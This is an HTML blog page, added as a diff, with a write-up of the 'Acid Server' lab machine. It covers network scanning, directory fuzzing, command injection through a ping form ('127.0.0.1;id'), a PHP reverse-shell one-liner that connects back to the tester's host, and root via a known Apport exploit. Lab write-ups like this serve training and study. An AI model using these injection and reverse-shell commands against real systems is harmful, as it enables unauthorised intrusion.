@@ -1,0 +1,270 @@
+
+<!DOCTYPE HTML>
+<html>
+<head>
+	<script data-cfasync="false" type="text/javascript" src="//use.typekit.net/axj3cfp.js"></script>
+	<script data-cfasync="false" type="text/javascript">try{Typekit.load();}catch(e){}</script>
+	<meta charset="utf-8">
+	<title>Acid Server  | Bob1Bob2</title>
+
+<meta name="author" content="Bob1Bob2"> 
+
+<meta name="description" content="Tools: netdiscover
+Nmap
+Wfuzz
+DirBuster
+Burp Vulnerabilities: Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation Use netdiscover &hellip;"> <meta name="keywords" content="">
+
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+	<link href="/atom.xml" rel="alternate" title="Bob1Bob2" type="application/atom+xml">
+	<link rel="canonical" href="">
+	<link href="/favicon.png" rel="shortcut icon">
+	<link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+	<link href="/stylesheets/font-awesome.min.css" rel="stylesheet" type="text/css">
+	<!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+	<script src="//ajax.googleapis.com/ajax/libs/jquery/1.7.2/jquery.min.js"></script>
+	<script type="text/javascript" src="/javascripts/jquery.fancybox.pack.js"></script>
+
+<script language="Javascript" type="text/javascript">
+$(document).ready(
+  function() {
+    (function($) {
+      $(".fancybox[data-content-id]").each(function() {
+        this.href = $(this).data('content-id');
+      });
+      $(".fancybox").fancybox({
+        beforeLoad: function() {
+          var el, 
+              id = $(this.element).data('title-id');
+
+          if (id) {
+            el = $('#' + id);
+
+            if (el.length) {
+              this.title = el.html();
+            }
+          }
+          if ($(this).data('content')) {
+            this.content = $(this).data('content');
+          }
+        },
+        helpers: {
+          title: {
+            type: 'inside'
+          }
+        }
+      });
+    })(jQuery);
+  }
+);
+</script>
+
+	
+</head>
+
+
+
+<body>
+	<header id="header" class="inner"><h1><a href="/">Bob1Bob2</a></h1>
+<h4>Pen Test Notes</h4>
+<nav id="main-nav"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</nav>
+<nav id="mobile-nav">
+	<div class="alignleft menu">
+		<a class="button">Menu</a>
+		<div class="container"><ul>
+	<li><a href="/">Blog</a></li>
+	<li><a href="/about">About</a></li>
+	<li><a href="/portfolio">Portfolio</a></li>
+	<li><a href="/archives">Archive</a></li>
+</ul>
+</div>
+	</div>
+	<div class="alignright search">
+		<a class="button"></a>
+		<div class="container">
+			<form action="https://www.google.com/search" method="get">
+				<input type="text" name="q" results="0">
+				<input type="hidden" name="q" value="site:wg135.github.io">
+			</form>
+		</div>
+	</div>
+</nav>
+
+
+</header>
+
+	<div id="content" class="inner"><article class="post">
+	<h2 class="title">Acid Server</h2>
+	<div class="entry-content"><h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>DirBuster</li>
+<li>Burp</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<p><a href="https://www.exploit-db.com/exploits/37088/">Apport (Ubuntu 14.04/14.10/15.04) - Race Condition Privilege Escalation</a></p>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.170is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.170 -p-</code></p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 33447 is open and running http service.</p>
+
+<p>run wfuzz,</p>
+
+<p><code>wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-small.txt --hc 404 http://192.168.41.170:33447/FUZZ 2&gt;/dev/null</code></p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a path <code>Challenge</code></p>
+
+<p>use DirBuster, check <code>http://192.168.41.170:33447/Challenge/</code></p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Check cake.php</p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check source code,</p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>/Magic_Box</code> may be a hidden path</p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use DirBuster again,</p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>command.php</code> looks interesting.</p>
+
+<p>check that page:</p>
+
+<p><img src="/images/blog/vulhub/acid_server/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>type <code>127.0.0.1</code> and use Burp</p>
+
+<p>looks like it pings the IP address I typed</p>
+
+<p><code>&lt;img src="/images/blog/vulhub/acid_server/Selection_010.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>now try <code>127.0.0.1;id</code></p>
+
+<p><code>&lt;img src="/images/blog/vulhub/acid_server/Selection_011.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>works. So there is a command injection vulnerability.</p>
+
+<p>In burp, instead of <code>id</code> command, using (URL encode):</p>
+
+<p><code>php -r '$sock=fsockopen("192.168.41.149",443);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</code></p>
+
+<p>get the shell</p>
+
+<p><code>&lt;img src="/images/blog/vulhub/acid_server/Selection_012.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p><code>python -c 'import pty; pty.spawn("/bin/bash")'</code></p>
+
+<p>after some enumeration</p>
+
+<p><code>cat /etc/*-release</code></p>
+
+<p><code>&lt;img src="/images/blog/vulhub/acid_server/Selection_013.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>Target is running Ubuntu 15.04</p>
+
+<p><code>earchsploit ubuntu | grep 15.04</code></p>
+
+<p><code>&lt;img src="/images/blog/vulhub/acid_server/Selection_014.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+
+<p>Since the target doesn&rsquo;t have wget and gcc, I setup ftp srever and compile the code locally and upload it.</p>
+
+<p>get root</p>
+
+<p><code>&lt;img src="/images/blog/vulhub/acid_server/Selection_015.png" title="[title manually exploit [alt text]]" &gt;</code></p>
+</div>
+
+
+<div class="meta">
+	<div class="date">
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2016-09-03T12:56:03-05:00" pubdate data-updated="true">2016-09-03 12:56:03 -0500</time></div>
+	
+
+
+	
+</div></article>
+
+	<div class="share">
+	<div class="addthis_toolbox addthis_default_style ">
+	
+	
+	<a class="addthis_button_tweet"></a>
+	
+	
+<!---	<a class="addthis_counter addthis_pill_style"></a> --->
+	</div>
+  <script type="text/javascript" src="http://s7.addthis.com/js/250/addthis_widget.js#pubid="></script>
+</div>
+
+
+</div>
+	<footer id="footer" class="inner">Copyright &copy; 2016
+
+    Bob1Bob2
+
+<br>
+Powered by Octopress.
+</footer>
+	<script src="/javascripts/slash.js"></script>
+<script src="/javascripts/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+	$('.fancybox').fancybox();
+})(jQuery);
+</script> <!-- Delete or comment this line to disable Fancybox -->
+
+
+
+
+
+
+</body>
+</html>
